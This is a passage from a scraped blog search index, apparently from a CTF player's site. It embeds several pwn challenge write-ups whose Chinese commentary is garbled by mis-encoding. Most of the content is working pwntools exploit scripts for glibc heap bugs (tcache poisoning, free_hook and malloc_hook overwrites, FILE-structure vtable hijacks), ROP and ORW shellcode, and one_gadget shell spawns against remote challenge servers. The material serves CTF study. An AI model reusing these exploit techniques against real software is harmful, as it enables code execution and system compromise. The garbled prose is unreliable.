    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x90,b&amp;quot;qqq&amp;quot;)
    realloc(0,b&amp;quot;&amp;quot;)

    realloc(0x90,p64(sys_addr))
    # realloc(0,b&amp;quot;&amp;quot;)

    calloc(0x10,b&amp;quot;/bin/sh\x00&amp;quot;)
    delete(b&amp;quot;c&amp;quot;)
    # delete(b&amp;quot;m&amp;quot;)

    io.interactive()
    
while True:
    try:
        io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,26672)
        # io=process(&amp;quot;./TWCTF_online_2019_asterisk_alloc&amp;quot;)
        pwn()
    
    except:
        io.close()
        continue
~~&lt;/code&gt;&lt;/pre&gt;
">TWCTF_online_2019_asterisk_alloc wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/IvtYDXMcd/"" data-c="
          &lt;p&gt;è¿™é¢˜è€ƒå¯Ÿreallocåˆ†é…å†…å­˜å’Œio leakï¼Œglibc 2.27ï¼Œå¯ä»¥æ‰“tcache dupå’Œtcache posioningï¼ŒåŠ«æŒfree_hook&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;å½“ptr == nullptrçš„æ—¶å€™ï¼Œç›¸å½“äºmalloc(size)ï¼Œ è¿”å›åˆ†é…åˆ°çš„åœ°å€
å½“ptr != nullptr &amp;amp;&amp;amp; size == 0çš„æ—¶å€™ï¼Œç›¸å½“äºfree(ptr)ï¼Œè¿”å›ç©ºæŒ‡é’ˆ
å½“sizeå°äºåŸæ¥ptræ‰€æŒ‡å‘çš„å†…å­˜çš„å¤§å°æ—¶ï¼Œç›´æ¥ç¼©å°ï¼Œè¿”å›ptræŒ‡é’ˆã€‚è¢«å‰Šå‡çš„é‚£å—å†…å­˜ä¼šè¢«é‡Šæ”¾ï¼Œæ”¾å…¥å¯¹åº”çš„binsä¸­å»
å½“sizeå¤§äºåŸæ¥ptræ‰€æŒ‡å‘çš„å†…å­˜çš„å¤§å°æ—¶ï¼Œå¦‚æœåŸptræ‰€æŒ‡å‘çš„chunkåé¢åˆè¶³å¤Ÿçš„ç©ºé—´ï¼Œé‚£ä¹ˆç›´æ¥åœ¨åé¢æ‰©å®¹ï¼Œè¿”å›ptræŒ‡é’ˆï¼›å¦‚æœåé¢ç©ºé—´ä¸è¶³ï¼Œå…ˆé‡Šæ”¾ptræ‰€ç”³è¯·çš„å†…å­˜ï¼Œç„¶åè¯•å›¾åˆ†é…sizeå¤§å°çš„å†…å­˜ï¼Œè¿”å›åˆ†é…åçš„æŒ‡é’ˆ
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;åˆ©ç”¨ä»¥ä¸Šæ€§è´¨å¯çŸ¥æ¯æ¬¡åˆ†é…å®Œä¹‹åéœ€è¦å†åˆ†é…ä¸€æ¬¡å¹¶ä¸”æ˜¯&lt;code&gt;ptr=null&lt;/code&gt;æ‰å¯ä»¥æ›´æ–°åˆ†é…çš„åœ°å€ï¼Œåˆ©ç”¨sizeå˜åŒ–å¯ä»¥è¶Šç•Œä¿®æ”¹tcacheçš„&lt;code&gt;fd&lt;/code&gt;æŒ‡é’ˆ&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
# context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])
context(log_level=&#39;debug&#39;)

def pwn():
    io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,28342)
        # io=process(&amp;quot;./roarctf_2019_realloc_magic&amp;quot;)
    elf=ELF(&amp;quot;./roarctf_2019_realloc_magic&amp;quot;)
    libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)
    def add(s,cc):
        io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
        io.sendlineafter(b&amp;quot;Size?\n&amp;quot;,str(s))
        io.sendafter(b&amp;quot;Content?\n&amp;quot;,cc)

    def delete():
        io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;2&amp;quot;)

    def cl():
        io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;666&amp;quot;)

    # gdb.attach(io)
    # pause()

    add(0x100,b&amp;quot;qwe&amp;quot;)
    add(0,b&amp;quot;&amp;quot;)

    add(0x10,b&amp;quot;aaa&amp;quot;)
    add(0,b&amp;quot;&amp;quot;)

    add(0x100,b&amp;quot;qwe&amp;quot;)

    add(0x60,b&amp;quot;qqq&amp;quot;)
    add(0,b&amp;quot;&amp;quot;)

    add(0x90,b&amp;quot;qqq&amp;quot;)

    for i in range(7):
        delete()

    add(0,b&amp;quot;&amp;quot;)

    add(0x60,b&amp;quot;qqq&amp;quot;)

    add(0x100,cyclic(0x68)+p64(0x91)+b&amp;quot;\x60\xc7&amp;quot;) #ä¿®æ”¹0xa1ä¸º0x91ï¼Œé˜²æ­¢å…¶freeåå›åˆ°åŸtcacheå¯¼è‡´åç»­ç”³è¯·å‡ºé—®é¢˜
    add(0,b&amp;quot;&amp;quot;)

    add(0x90,b&amp;quot;aaa&amp;quot;)
    add(0,b&amp;quot;&amp;quot;)

    add(0x90,p64(0xfbad1887)+p64(0)*3+b&amp;quot;\x00&amp;quot;)
    leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x1c80-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
    print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
    one_gadget=[0x4f2c5,0x4f322,0x10a38c]
    shell=one_gadget[1]+leak_addr
    malloc_hook=libc.sym[b&amp;quot;__malloc_hook&amp;quot;]+leak_addr
    free_hook=libc.sym[b&amp;quot;__free_hook&amp;quot;]+leak_addr
    sys_addr=libc.sym[b&amp;quot;system&amp;quot;]+leak_addr

    cl()

    add(0x100,b&amp;quot;ppp&amp;quot;)

    add(0x60,b&amp;quot;qqq&amp;quot;)
    add(0,b&amp;quot;&amp;quot;)

    add(0x90,b&amp;quot;www&amp;quot;)

    for i in range(2):
        delete()

    add(0,b&amp;quot;&amp;quot;)

    add(0x60,b&amp;quot;a&amp;quot;)

    add(0x100,cyclic(0x68)+p64(0x81)+p64(free_hook-0x8))
    add(0,b&amp;quot;&amp;quot;)

    add(0x90,b&amp;quot;/bin/sh\x00&amp;quot;)
    add(0,b&amp;quot;&amp;quot;)

    add(0x90,b&amp;quot;/bin/sh\x00&amp;quot;+p64(sys_addr))
    # add(0,b&amp;quot;&amp;quot;)
    delete()
    # io.sendlineafter(b&amp;quot;&amp;gt;&amp;gt; &amp;quot;,b&amp;quot;1&amp;quot;)
    # io.sendlineafter(b&amp;quot;Size?\n&amp;quot;,b&amp;quot;1&amp;quot;)


    io.interactive()

while True:
    try:
        pwn()
    except:
        io.close()
        continue

# 0x4f2c5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f322 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">roarctf_2019_realloc_magic</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/mqKBma3Sl/"" data-c="
          &lt;p&gt;seccomp dumpå‘ç°æœ¬é¢˜ç¦ç”¨&lt;code&gt;execve()&lt;/code&gt;ç³»ç»Ÿè°ƒç”¨ï¼Œæ•…è€ƒè™‘æ‰“orwï¼Œç¨‹åºä¸€å¼€å§‹å¼€è¾Ÿä¸€æ®µå¯å†™å¯æ‰§è¡Œæ®µï¼Œä¸”å­˜åœ¨å‡½æ•°&lt;code&gt;jmp_rsp&lt;/code&gt;ï¼Œå¯ä»¥å°†å…¶å¡«å……è‡³retåœ°å€æ§åˆ¶ç¨‹åºæ‰§è¡Œæµ&lt;br&gt;
æ³¨æ„æ„é€ readçš„shellcodeæ—¶ç³»ç»Ÿè°ƒç”¨ï¼Œ&lt;code&gt;rax=0&lt;/code&gt;&lt;br&gt;
&lt;s&gt;ä¸ç„¶å°±æ˜¯æ— å°½çš„debug&lt;/s&gt;&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,25349)
# io=process(&amp;quot;./bad&amp;quot;)
elf=ELF(&amp;quot;./bad&amp;quot;)

jmp_rsp=0x400a01

jmp_shellcode=asm(&#39;&#39;&#39;
sub rsp,0x30
jmp rsp
&#39;&#39;&#39;)

orw_shellcode=asm(&#39;&#39;&#39;
  push   0x67616c66
  push   0x2
  pop    rax
  mov    rdi,rsp
  xor    rsi,rsi
  syscall 

  mov    rdi,rax
  xor    rax,rax
  mov    rsi,0x123500
  push   0x50
  pop    rdx
  syscall 

  push   0x1
  pop    rax
  xor rdi,rdi
  mov    rsi,0x123500
  push   0x50
  pop    rdx
  syscall
&#39;&#39;&#39;)

read_shellcode=asm(&#39;&#39;&#39;
    xor rax,rax
    mov edi,0
    push 0x123000
    pop rsi
    push 0x100
    pop rdx
    syscall              
&#39;&#39;&#39;)

call_shellcode=asm(&#39;&#39;&#39;
mov rax,0x123000            
call rax
&#39;&#39;&#39;)

# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;fun!\n&amp;quot;)
payload=read_shellcode+call_shellcode
payload=payload.ljust(0x28,b&amp;quot;a&amp;quot;)+p64(jmp_rsp)+jmp_shellcode
io.send(payload)


io.recvuntil(b&amp;quot;d!\n&amp;quot;)
payload=orw_shellcode
# payload=asm(shellcraft.open(&amp;quot;./flag&amp;quot;)+shellcraft.read(3,0x123500,0x100)+shellcraft.write(1,0x123500,0x100))
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[æå®¢å¤§æŒ‘æˆ˜ 2019]Not Bad wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/0AqzRuE5E/"" data-c="
          &lt;p&gt;æ³„éœ²libc+&lt;code&gt;__environ&lt;/code&gt;æ³„éœ²æ ˆåœ°å€æ‰“orw&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node2.anna.nssctf.cn&amp;quot;,28492)
# io=process(&amp;quot;./intorw&amp;quot;)
elf=ELF(&amp;quot;./intorw&amp;quot;)
libc=ELF(&amp;quot;./libc.so.6&amp;quot;)

pop_rdi=next(elf.search(asm(&amp;quot;pop rdi;ret&amp;quot;)))
ret=0x400726

def pre():
    io.sendlineafter(b&amp;quot;read\n&amp;quot;,b&amp;quot;-1&amp;quot;)
    io.recvuntil(b&amp;quot;read:\n&amp;quot;)


pre()
payload=cyclic(0x28)+p64(pop_rdi)+p64(elf.got[b&amp;quot;puts&amp;quot;])+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(0x4009c4)
io.send(payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-libc.sym[b&amp;quot;puts&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))

open_a=leak_addr+libc.sym[b&amp;quot;open&amp;quot;]
read_a=leak_addr+libc.sym[b&amp;quot;read&amp;quot;]
write_a=leak_addr+libc.sym[b&amp;quot;write&amp;quot;]
environ=leak_addr+libc.sym[b&amp;quot;__environ&amp;quot;]
pop_rsi=leak_addr+0x2be51 
pop_rdx_r12=leak_addr+0x11f497
pop_rax=leak_addr+0x45eb0
syscall_ret=leak_addr+0x091396

# gdb.attach(io)
# pause()

pre()
payload=cyclic(0x28)+p64(pop_rdi)+p64(environ)+p64(elf.plt[b&amp;quot;puts&amp;quot;])+p64(0x4009c4)
io.send(payload)
stack_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;).ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;stack_addr: &amp;quot;+hex(stack_addr))

# gdb.attach(io)
# pause()

#open
orw=p64(pop_rdi)+p64(stack_addr-0x48)+p64(pop_rsi)+p64(0)+p64(open_a)
#read
orw+=p64(pop_rdi)+p64(3)+p64(pop_rsi)+p64(0x601300)+p64(pop_rdx_r12)+p64(0x50)+p64(0)+p64(read_a)
#write
orw+=p64(pop_rdi)+p64(1)+p64(pop_rsi)+p64(0x601300)+p64(pop_rdx_r12)+p64(0x50)+p64(0)+p64(write_a)


pre()

payload=cyclic(0x28)+orw+b&amp;quot;./flag\x00\x00&amp;quot;
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
">[HNCTF 2022 WEEK2]intorw wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/k-TWvtUVK/"" data-c="
          &lt;h3 id=&#34;pwn_1&#34;&gt;PWN_1:&lt;/h3&gt;
&lt;p&gt;IO_FILE_pluså„ç§åç§»ï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;0x0   _flags
0x8   _IO_read_ptr
0x10  _IO_read_end
0x18  _IO_read_base
0x20  _IO_write_base
0x28  _IO_write_ptr
0x30  _IO_write_end
0x38  _IO_buf_base
0x40  _IO_buf_end
0x48  _IO_save_base
0x50  _IO_backup_base
0x58  _IO_save_end
0x60  _markers
0x68  _chain
0x70  _fileno
0x74  _flags2
0x78  _old_offset
0x80  _cur_column
0x82  _vtable_offset
0x83  _shortbuf
0x88  _lock
//IO_FILE_complete
0x90  _offset
0x98  _codecvt
0xa0  _wide_data
0xa8  _freeres_list
0xb0  _freeres_buf
0xb8  __pad5
0xc0  _mode
0xc4  _unused2
0xd8  vtable
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;è¾“å…¥è´Ÿæ•°æº¢å‡º&lt;code&gt;(A0-20)/8&lt;/code&gt;ï¼ˆqword 8bytesï¼‰å¯ä»¥åå‘æº¢å‡ºè‡³&lt;code&gt;stdout&lt;/code&gt;æŒ‡é’ˆå¤„ï¼Œå¯ä»¥å€Ÿæ­¤æ§åˆ¶&lt;code&gt;_IO_2_1_stdout&lt;/code&gt;ç»“æ„ä½“ï¼Œè¿›è€Œä¿®æ”¹ç»“æ„ä½“ä¸­æˆå‘˜ï¼Œä¿®æ”¹&lt;code&gt;_flags&lt;/code&gt;ä¸º&lt;code&gt;/bin/sh\x00&lt;/code&gt;å­—ç¬¦ä¸²&lt;br&gt;
&lt;code&gt;vtable&lt;/code&gt;ä¸º&lt;code&gt;&amp;amp;_IO_2_1_stdout+0x10&lt;/code&gt;&lt;br&gt;
&lt;code&gt;_IO_save_base&lt;/code&gt;ä¸º&lt;code&gt;system&lt;/code&gt;åœ°å€&lt;br&gt;
&lt;code&gt;_lock&lt;/code&gt;(&amp;amp;_IO_2_1_stdout+0x88å¤„)å€¼ä¿æŒä¸å˜ï¼ˆå›ºå®šåç§»ï¼‰&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1685446603675.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;p&gt;&lt;code&gt;puts-&amp;gt;vtable-&amp;gt;_IO_2_1_stdout+0x10(åŸ _IO_new_file_xsputnåç§»ä¸º0x38ï¼Œä¿®æ”¹åå®é™…è°ƒç”¨+0x48,å³_IO_save_base)-&amp;gt;system(_IO_save_base)&amp;lt;-&amp;quot;/bin/sh\x00&amp;quot;(åŸ_flagså­—æ®µåšå‚æ•°)&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.23æœ‰æ•ˆï¼Œä»¥ä¸Šæ— æ•ˆ&lt;/p&gt;
&lt;p&gt;expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

# io=process(&amp;quot;./nsctf_online_2019_pwn1&amp;quot;)
io=remote(&amp;quot;node4.buuoj.cn&amp;quot;, 27333)
elf=ELF(&amp;quot;./nsctf_online_2019_pwn1&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def add(n,cc):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size:\n&amp;quot;,str(n))
    io.sendafter(b&amp;quot;content:\n&amp;quot;,cc)

def delete(n):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;2&amp;quot;)
    io.sendafter(b&amp;quot;index:\n&amp;quot;,str(n))
    
def edit(n,s,cc):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;4&amp;quot;)
    io.sendlineafter(b&amp;quot;index:\n&amp;quot;,str(n))
    io.sendlineafter(b&amp;quot;size:\n&amp;quot;,str(s))
    io.sendafter(b&amp;quot;content:\n&amp;quot;,cc)

# gdb.attach(io)
# pause()

add(0x100,b&amp;quot;aaa&amp;quot;)

payload=p64(0xfbad1887)+p64(0)*3+b&amp;quot;\x00&amp;quot;
edit(-0x10,len(payload),payload)
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
libc_base=leak_addr-libc.sym[b&amp;quot;_IO_file_jumps&amp;quot;]
print(&amp;quot;libc_base: &amp;quot;+hex(libc_base))

one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
shell=one_gadget[1]+libc_base
sys_addr=libc.sym[b&amp;quot;system&amp;quot;]+libc_base
_IO_2_1_stdout=leak_addr+0x1f40


fs=FileStructure()
fs.flags=b&amp;quot;/bin/sh\x00&amp;quot;
fs.vtable=p64(_IO_2_1_stdout+0x10)
fs._IO_save_base=p64(sys_addr)
fs._lock=p64(libc_base+0x3c6780)


edit(-0x10,len(fs),bytes(fs))

io.interactive()

# 0x45216 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;br&gt;&lt;/br&gt;&lt;/p&gt;
&lt;h3 id=&#34;pwn_2&#34;&gt;PWN_2:&lt;/h3&gt;
&lt;p&gt;ä¸€é“fastbin attackæ‰“one_gadget,&lt;code&gt;realloc&lt;/code&gt;è°ƒåç§»&lt;br&gt;
deleteæ“ä½œæ¯æ¬¡æŒ‡é’ˆç½®ç©ºï¼Œä½†æ˜¯æœ‰updateå‡½æ•°off by oneå¯ä»¥ä¿®æ”¹æŒ‡é’ˆä½ä½ï¼Œå¯ä»¥æŒ‡å‘ä»»æ„å †å—è¿›è¡Œæ“ä½œ&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,29081)
# io=process(&amp;quot;./nsctf_online_2019_pwn2&amp;quot;)
elf=ELF(&amp;quot;./nsctf_online_2019_pwn2&amp;quot;)
libc=ELF(&amp;quot;./libc-2.23.so&amp;quot;)

def pre(cc):
    io.recvuntil(b&amp;quot;name\n&amp;quot;)
    io.send(cc)
    
def add(s):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;,b&amp;quot;1&amp;quot;)
    io.sendlineafter(b&amp;quot;size\n&amp;quot;,str(s))
    
def delete():
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;, b&amp;quot;2&amp;quot;)

def show():
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;, b&amp;quot;3&amp;quot;)
        
def update(cc):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;, b&amp;quot;4&amp;quot;)
    io.sendafter(b&amp;quot;name\n&amp;quot;,cc)
    
def edit(cc):
    io.sendlineafter(b&amp;quot;exit\n&amp;quot;, b&amp;quot;5&amp;quot;)
    io.sendafter(b&amp;quot;note\n&amp;quot;,cc)

# gdb.attach(io)
# pause()

pre(cyclic(0x30))

add(0x90)
add(0x30)
update(cyclic(0x30)+b&amp;quot;\x10&amp;quot;)
delete()

add(0x20)
# edit(cyclic(0x18)+p64(0x10))
update(cyclic(0x30)+b&amp;quot;\x40&amp;quot;)

show()
leak_addr=u64(io.recvuntil(b&amp;quot;\x7f&amp;quot;)[-6:].ljust(8,b&amp;quot;\x00&amp;quot;))-0x68-libc.sym[b&amp;quot;__malloc_hook&amp;quot;]
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
realloc=libc.sym[b&amp;quot;__libc_realloc&amp;quot;]+leak_addr
malloc_hook=libc.sym[b&amp;quot;__malloc_hook&amp;quot;]+leak_addr
one_gadget=[0x45216,0x4526a,0xf02a4,0xf1147]
shell=one_gadget[1]+leak_addr

add(0x60)
delete()

add(0x10)
update(cyclic(0x30)+b&amp;quot;\x40&amp;quot;)
edit(p64(malloc_hook-0x23))

add(0x60)
add(0x60)
edit(cyclic(0xb)+p64(shell)+p64(realloc+0x10))

# gdb.attach(io)
# pause()

add(0x10)
# add(0x10)
    
io.interactive()

# 0x45216 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">nsctf_online_2019_pwn_1&2 wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/n_AKurXjc/"" data-c="
          &lt;p&gt;ç¨‹åºè¿è¡Œæµç¨‹ï¼š&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1685368754887.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
è°ƒç”¨&lt;code&gt;exit()&lt;/code&gt;å‡½æ•°çš„æµç¨‹ï¼š&lt;br&gt;
&lt;code&gt;exit()-&amp;gt;_dl_fini()-&amp;gt;_rtld_global-&amp;gt;_rtld_global._rtld_lock_recursive-&amp;gt;_rtld_global._rtld_unlock_recursive&lt;/code&gt;&lt;br&gt;
å…¶ä¸­&lt;code&gt;_rtld_global._rtld_lock_recursive-&lt;/code&gt;å’Œ&lt;code&gt;_rtld_global._rtld_unlock_recursive&lt;/code&gt;å°±æ˜¯æ‰€è¯´çš„&lt;code&gt;exit_hook&lt;/code&gt;&lt;br&gt;
æ­¤é¢˜å¯ä»¥ä»»æ„åœ°å€å†™5æ¬¡ï¼Œæ¯æ¬¡å†™1å­—èŠ‚ï¼Œå¼€å¤´æ³„éœ²&lt;code&gt;sleep()&lt;/code&gt;å‡½æ•°åœ°å€ï¼Œå¯ä»¥æ®æ­¤ç®—å‡ºlibcåŸºå€ï¼Œè€Œ&lt;code&gt;_rtld_global&lt;/code&gt;åœ¨ldä¸Šï¼Œæ‰€ä»¥æ ¹æ®åç§»æ±‚å‡ºldåŸºå€ï¼Œé€šè¿‡åç§»æ±‚å‡º&lt;code&gt;exit_hook&lt;/code&gt;åœ°å€&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1685369489489.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
&lt;img src=&#34;https://oraclepi.tech/post-images/1685369494078.png&#34; alt=&#34;&#34; loading=&#34;lazy&#34;&gt;&lt;br&gt;
æœ€åå°†one_gadgetå†™å…¥&lt;code&gt;exit_hook&lt;/code&gt;å³å¯&lt;br&gt;
expï¼š&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;node4.buuoj.cn&amp;quot;,29187)
# io=process(&amp;quot;./the_end&amp;quot;)
elf=ELF(&amp;quot;./the_end&amp;quot;)
libc=ELF(&amp;quot;./libc-2.27.so&amp;quot;)
ld=ELF(&amp;quot;./ld-2.27.so&amp;quot;)

def ss(c,cc):
    io.send(c)
    io.send(cc)

io.recvuntil(b&amp;quot;gift &amp;quot;)
leak_addr=int(io.recv(14),16)
print(&amp;quot;leak_addr: &amp;quot;+hex(leak_addr))
libc_base=leak_addr-libc.sym[b&amp;quot;sleep&amp;quot;]
print(&amp;quot;libc_base: &amp;quot;+hex(libc_base))
ld_base=libc_base+0x3f1000
io.recvuntil(b&amp;quot;;)\n&amp;quot;)

_rtld_global=ld_base+ld.sym[b&amp;quot;_rtld_global&amp;quot;]
__rtld_lock_unlock_recursive=_rtld_global+0xf08
print(&amp;quot;_rtld_global: &amp;quot;+hex(_rtld_global))
print(&amp;quot;__rtld_lock_unlock_recursive: &amp;quot;+hex(__rtld_lock_unlock_recursive))

# one_gadget=[0x4f365,0x4f3c2,0x10a45c]
one_gadget=[0x4f2c5,0x4f322,0x10a38c]
shell=one_gadget[1]+libc_base
print(&amp;quot;shell: &amp;quot;,hex(shell))

for i in range(5):
    ss(p64(__rtld_lock_unlock_recursive+i),p64(shell)[i:i+1])

io.sendline(b&amp;quot;exec 1&amp;gt;&amp;amp;0&amp;quot;)
io.sendline(b&amp;quot;cat flag&amp;quot;)

io.interactive()

# 0x4f2c5 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   rsp &amp;amp; 0xf == 0
#   rcx == NULL

# 0x4f322 execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x40, environ)
# constraints:
#   [rsp+0x40] == NULL

# 0x10a38c execve(&amp;quot;/bin/sh&amp;quot;, rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL
&lt;/code&gt;&lt;/pre&gt;
">hctf2018_the_end wp</a>
      </div>
      
      <div class="item">
        <a class="result-title" style="opacity: 0;" href="https://oraclepi.tech/post/wOZrtuJ_Q1/"" data-c="
          &lt;p&gt;&lt;s&gt;å…¨æ ˆâœŒå¤ªå¤šè¾£&lt;/s&gt;&lt;br&gt;
æŒ‰ç…§é™„ä»¶ç¼–å·ï¼š&lt;/p&gt;
&lt;h4 id=&#34;attachment-11makewishes&#34;&gt;attachment-11ï¼š(makewishes)&lt;/h4&gt;
&lt;p&gt;ä¼ªéšæœº+canaryä¿æŠ¤çš„ret2text&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
from ctypes import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;59.110.164.72&amp;quot;,10001)
# io=process(&amp;quot;./makewishes&amp;quot;)
cs=cdll.LoadLibrary(&amp;quot;/lib/x86_64-linux-gnu/libc.so.6&amp;quot;)


# gdb.attach(io)
# pause()

io.recvuntil(b&amp;quot;first wish\n&amp;quot;)
payload=cyclic(0xe)+p64(0)
io.send(payload)
cs.srand(0)

io.recvuntil(b&amp;quot;number!\n&amp;quot;)
io.sendline(str(cs.rand()%9+1))

io.recvuntil(b&amp;quot;second wish!\n&amp;quot;)
payload=b&amp;quot;%11$p&amp;quot;
io.sendline(payload)
canary=int(io.recv(18),16)
print(&amp;quot;canary:  &amp;quot;+hex(canary))

cs.srand(0)

io.recvuntil(b&amp;quot;number!\n&amp;quot;)
io.sendline(str(cs.rand()%9+1))

io.recvuntil(b&amp;quot;final wish!\n&amp;quot;)
payload=cyclic(0x28)+p64(canary)+p64(0)+p64(0x4011d6)
io.send(payload)

io.interactive()
&lt;/code&gt;&lt;/pre&gt;
&lt;h4 id=&#34;attachment-12login&#34;&gt;attachment-12ï¼š(Login)&lt;/h4&gt;
&lt;p&gt;ç­¾åˆ°é¢˜ï¼Œret2libc&lt;br&gt;
exp:&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;from pwn import *
context(log_level=&#39;debug&#39;,arch=&#39;amd64&#39;,terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;])

io=remote(&amp;quot;59.110.164.72&amp;quot;,10000)
# io=process(&amp;quot;./Login&amp;quot;)
elf=ELF(&amp;quot;./Login&amp;quot;)
